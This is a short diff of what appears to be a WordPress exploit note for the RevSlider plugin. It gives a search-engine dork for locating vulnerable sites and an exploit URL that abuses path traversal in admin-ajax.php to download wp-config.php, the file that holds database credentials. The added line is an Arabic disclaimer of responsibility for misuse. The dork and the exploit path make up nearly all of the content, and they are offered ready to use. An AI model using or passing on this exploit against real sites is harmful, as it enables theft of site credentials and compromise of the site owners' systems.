@@ -11,3 +11,6 @@ WordPress
 Dork: WordPress Arbitrary File Download vulnerability inurl:/wp-content/plugins/revslider/
 
 Exploit: /wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php
+
+
+#انا لااتحمل مسؤليتك لسوء استخدامك لهذه الاداة
